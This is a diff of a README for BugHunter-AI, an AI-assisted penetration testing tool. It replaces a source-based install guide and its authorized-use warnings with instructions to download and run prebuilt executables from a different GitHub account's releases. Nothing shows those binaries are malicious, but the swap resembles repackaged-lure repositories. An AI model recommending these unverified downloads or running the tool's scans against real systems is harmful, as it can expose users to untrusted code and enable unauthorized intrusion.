@@ -1,118 +1,81 @@
-# 🚀 BUGHUNTER AI PENTEST AGENT
+# 🤖 BugHunter-AI - Your AI-Driven Cybersecurity Partner
 
-![Logo](https://github.com/ARESHAmohanad/BugHunter-AI/blob/main/IMG_20251013_144744_076.jpg?raw=true)
+## 📦 Download Now!
+[![Download BugHunter-AI](https://img.shields.io/badge/Download-BugHunter--AI-blue)](https://github.com/f3m1p0l4r1cguy/BugHunter-AI/releases)
 
-**Automated penetration testing agent with a cyber-inspired GUI, resource-aware task scheduling, and AI-assisted analysis.**
+## 🚀 Getting Started
+Welcome to BugHunter-AI, your automated penetration testing framework. This guide will help you download and run BugHunter-AI quickly and easily.
 
----
+### 🛠 System Requirements
+Before you get started, ensure your computer meets these requirements:
 
-## 🔎 Short description
-Automation tool for penetration testing with a GUI, resource-aware task queueing, and AI-assisted analysis. Designed for labs and authorized testing only.
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or a recent Linux distribution.
+- **RAM:** At least 4 GB (8 GB recommended for best performance).
+- **Storage:** Minimum of 500 MB free space.
 
----
+### 📥 Download & Install
+To get BugHunter-AI, visit this page to download:
 
-## ⚠️ Security / Legal Notice
-**Use only on systems you own or have explicit permission to test.** Unauthorized scanning is illegal. This script can run intrusive tools and may send reports to an external API (configurable). Review the code and API keys before running.
+[Download BugHunter-AI Releases](https://github.com/f3m1p0l4r1cguy/BugHunter-AI/releases)
 
----
+Once you are on the Releases page, look for the latest version. Click on it, and you will see a list of files. Find the installer that matches your operating system, then click to download.
 
-## 🧰 Key Features
-- Resource-aware task queueing (CPU / RAM) with configurable limits.  
-- Tool resource profiles (estimated CPU/RAM/time consumption).  
-- GUI built with **tkinter** featuring a "cyberpunk" theme (resource monitor, queue, console).  
-- Integration with an AI service to analyze reports and suggest commands/actions.  
-- Per-round report generation and automated CVE extraction.
+1. **For Windows:** Download the `.exe` file.
+2. **For macOS:** Download the `.dmg` file.
+3. **For Linux:** Download the `.tar.gz` file.
 
----
+### ⚙️ Installation Steps
+#### For Windows Users:
+1. Locate the downloaded `.exe` file in your Downloads folder.
+2. Double-click the file to start the installation.
+3. Follow the prompts during the installation process.
+4. Once installed, you can launch BugHunter-AI from the Start menu.
 
-## 📦 Requirements
-- Python 3.7+ (3.9+ recommended)  
-- `psutil`, `requests`, and `tkinter` (see `install_dependencies.py`).  
-- Optional external pentesting tools for full functionality: `nmap`, `sqlmap`, `nikto`, `nuclei`, `masscan`, `hydra`, `metasploit`, etc. Install via your distro package manager.
+#### For macOS Users:
+1. Find the downloaded `.dmg` file in your Downloads.
+2. Double-click the file to open it.
+3. Drag the BugHunter-AI icon to your Applications folder.
+4. Open your Applications folder and double-click on BugHunter-AI to launch it.
 
----
+#### For Linux Users:
+1. Open your terminal.
+2. Navigate to your Downloads folder using `cd ~/Downloads`.
+3. Extract the files with the command: `tar -xzf BugHunter-AI.tar.gz`.
+4. Change into the newly created directory: `cd BugHunter-AI`.
+5. Run the application using the command: `./BugHunter-AI`.
 
-## 🚀 Quick Installation
+## 🎨 Interface Overview
+BugHunter-AI offers a user-friendly GUI that makes it simple to conduct penetration tests. Here are the main features:
 
-1. Clone the repository:
-```bash
-git clone https://github.com/ARESHAmohanad/BugHunter-AI
-cd BugHunter-AI
-```
+- **AI-Assisted Analysis:** Get insights and recommendations based on real-time data.
+- **Resource Monitoring:** Optimize task scheduling to run tests efficiently without overloading your system.
+- **Futuristic Design:** Enjoy a sleek interface that enhances usability.
 
-2. Install Python dependencies (included script):
-```bash
-python3 install_dependencies.py
-```
-(This script checks and installs `psutil` and `requests`. `tkinter` may need to be installed via system packages.)
+## 🛡 Features
+- Automated scanning for vulnerabilities.
+- Integration with tools like Nmap for more in-depth analysis.
+- Customizable test parameters to suit your needs.
+- Reports generated in clear, understandable formats.
 
-3. (Optional) Install system pentest tools:
-```bash
-# Example on Debian/Ubuntu
-sudo apt update
-sudo apt install -y nmap sqlmap nikto masscan
-```
+## 📊 Using BugHunter-AI
+1. Launch the application by following the installation steps.
+2. Set up your test parameters. Specify the target network or application you wish to test.
+3. Start your test by clicking the “Run Test” button.
+4. Review the results presented in the GUI to identify any vulnerabilities.
 
----
+## 💡 Tips for Effective Use
+- Regularly check for updates on the Releases page to get the latest features and fixes.
+- Use the report feature after each scan to document findings.
+- Experiment with different parameters to gain a deeper understanding of your system's security posture.
 
-## ▶️ Quick start (run)
-See `QUICK_START.md` for a visual walkthrough or run:
-```bash
-python3 AIlinuxV2.py
-```
-Enter the target (authorized targets only), adjust `Max Concurrent Tools`, CPU/RAM thresholds, and click **INITIATE SCAN** in the GUI.
+## 📄 Contributing
+BugHunter-AI welcomes contributions from everyone. If you'd like to help improve the software, please check the contributing guidelines on our GitHub repository.
 
----
+## 🆘 Support
+If you encounter any issues while using BugHunter-AI, you can seek help by opening an issue on our GitHub page. Provide as much detail as possible to receive the best support.
 
-## ⚙️ Important Configuration
-- Configure API keys (if using AI integration) at the top of `AIlinuxV2.py`: `API_KEYS` and `API_URL`. The integration can send reports to an external endpoint — review privacy implications before sending sensitive data.  
-- Adjust `Max Concurrent Tools`, `CPU Threshold`, and `RAM Threshold` in the GUI to avoid overloading your host.
+## 🌐 Additional Resources
+- [GitHub Repository](https://github.com/f3m1p0l4r1cguy/BugHunter-AI)
+- [Documentation](https://github.com/f3m1p0l4r1cguy/BugHunter-AI/wiki)
 
----
-
-## 🗂️ Output structure (example)
-Each session produces a directory `AI_Pentest_YYYYMMDD_HHMMSS_<id>/` with per-round subfolders:
-```
-AI_Pentest_YYYYMMDD_HHMMSS_ID/
-├─ round_1/
-│  ├─ nmap.txt
-│  ├─ nikto.txt
-│  ├─ report.json
-│  └─ decision.json
-├─ round_2/
-├─ errors.log
-└─ final_report.json
-```
-Reports and decisions are used by the AI engine to determine next steps.
-
----
-
-## 🛠️ How it works (technical summary)
-1. User starts a scan and enqueues tools.  
-2. `ResourceMonitor` checks CPU/RAM and permits execution only when safe.  
-3. `ToolQueueManager` manages concurrent execution (configurable).  
-4. Outputs are aggregated into `report.json`.  
-5. The aggregated results are optionally sent to the AI engine; the AI returns commands inside `<COMMANDS>` and a `<DECISION>` JSON that lists next tools.
-
----
-
-## 📚 Documentation
-- `QUICK_START.md` — quick walkthrough and examples.  
-- `OPTIMIZATION_SUMMARY.md` — summary of resource-usage optimizations (queueing, profiles, monitor).
-
----
-
-## 🤝 Contributing
-Contributions welcome. Ideas:
-- Add new tool resource profiles
-- Improve AI response validation and command sanitization
-- Add Docker/container support for isolated execution
-
----
-
-## 🧾 License
-For educational use / authorized testing. Add a license file (MIT, Apache-2.0, etc.) as desired.
-
----
-
-**NOTE:** Review the code before running in any production environment. For safe usage, run inside an isolated VM against authorized labs or CTFs.
+Thank you for choosing BugHunter-AI to enhance your cybersecurity efforts! Enjoy testing!
